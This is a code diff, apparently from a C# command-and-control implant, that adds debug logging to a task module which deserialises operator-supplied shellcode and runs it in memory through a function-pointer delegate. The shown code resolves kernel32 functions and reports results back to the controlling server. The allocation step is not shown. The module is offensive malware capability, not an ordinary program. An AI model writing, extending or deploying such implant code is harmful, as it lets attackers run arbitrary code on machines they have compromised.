@@ -42,6 +42,7 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
 
             List<string> resolvFuncs = new List<string>()
             {
@@ -51,17 +52,20 @@ namespace Workflow
 
             if (!Resolver.TryResolveFuncs(resolvFuncs, "k32", out var err))
             {
+                DebugLog.Log($"{Name} failed to resolve functions [{job.task.id}]");
                 messageManager.WriteLine(err, job.task.id, true, "error");
                 return;
             }
 
             ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);
             if(args is null){
+                DebugLog.Log($"{Name} args null [{job.task.id}]");
                 return;
             }
-            
+
             if (!args.Validate())
             {
+                DebugLog.Log($"{Name} missing shellcode bytes [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = true,
@@ -111,10 +115,13 @@ namespace Workflow
             BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
             try
             {
+                DebugLog.Log($"{Name} invoking shellcode at 0x{bufAddr:X} [{job.task.id}]");
                 shellcodeDelegate.Invoke();
+                DebugLog.Log($"{Name} completed [{job.task.id}]");
             }
             catch(Exception e)
             {
+                DebugLog.Log($"{Name} execution error: {e.Message} [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = false,
